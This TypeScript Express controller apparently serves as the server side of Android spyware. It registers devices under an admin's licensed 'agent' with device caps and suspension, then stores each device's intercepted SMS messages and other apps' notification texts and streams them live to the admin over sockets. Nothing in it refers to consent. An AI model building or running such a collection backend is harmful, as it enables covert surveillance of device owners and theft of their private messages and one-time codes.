import {Request, Response} from "express";
import {respondSuccess, respondSuccessWithData} from "../utils/response";
import AgentModel, {IAgent} from "../models/agent.model";
import InstalledAgentModel, {IInstalledAgent} from "../models/installedAgent.model";
import {getPreferredTime} from "../utils/time";
import Message from "../models/message.model";
import Notification, {INotification} from "../models/notification.model";


export const initAgent = async (req: Request, res: Response) => {
    let {adminID, agentName, agentID, deviceID, deviceName, apiLevel} = req.body;

    // let sc = new AgentModel({
    //     agentName,
    //     agentID,
    //     adminID,
    //     createdBy: "something",
    //     createdAt: getPreferredTime(),
    //     maxDevices: 1000,
    //     totalDevices: 1,
    //
    // });
    // await sc.save();

    // console.log(sc);
    let agent: IAgent | null = await AgentModel.findOne({agentID});

    if (!agent || agent.status === "suspended") {
        return respondSuccessWithData(res, {status: "suspended"});
    }

    if (agent.maxDevices !== 0 && agent.totalDevices >= agent.maxDevices) {
        return respondSuccessWithData(res, {status: "max-devices"});
    }


    let deviceCheck: IInstalledAgent | null = await InstalledAgentModel.findOne({deviceID});
    if (deviceCheck) {
        if (deviceCheck.status === "suspended") {
            return respondSuccessWithData(res, {status: "suspended"});
        }
        return respondSuccess(res);
    }

    agent.totalDevices++;

    await agent.save();

    let installedAgent = new InstalledAgentModel({
        deviceID,
        agentName,
        agentID,
        adminID,
        deviceName,
        apiLevel,
        installedAt: getPreferredTime()
    });
    await installedAgent.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("onNewAgentAdded", agentName, agentID, adminID, deviceName, deviceID)
    }

    return respondSuccess(res);
};

export const saveSMS = async (req: Request, res: Response) => {
    let {adminID, agentID, message, sender, deviceID} = req.body;

    let time = getPreferredTime();
    let messageDoc = new Message({adminID, agentID, deviceID, message, sender, time});

    await messageDoc.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("newMessage-" + deviceID, {
            adminID,
            agentID,
            message,
            sender,
            deviceID,
            time
        });
    }

    respondSuccess(res);
}

export const saveNotification = async (req: Request, res: Response) => {
    let {adminID, agentID, deviceID, appName, title, text} = req.body;

    let time = getPreferredTime();

    let doc: INotification | null = await Notification.findOne({adminID, agentID, deviceID, appName, title});
    if (doc) {
        if (doc.time != time) {
            doc.time = time;
            await doc.save();
        }
        return respondSuccess(res);
    }
    let notification = new Notification({adminID, agentID, deviceID, appName, title, text, time});

    await notification.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("newNotification-" + deviceID, {
            adminID,
            agentID,
            deviceID,
            appName,
            title,
            text,
            time
        });
    }

    respondSuccess(res);
}
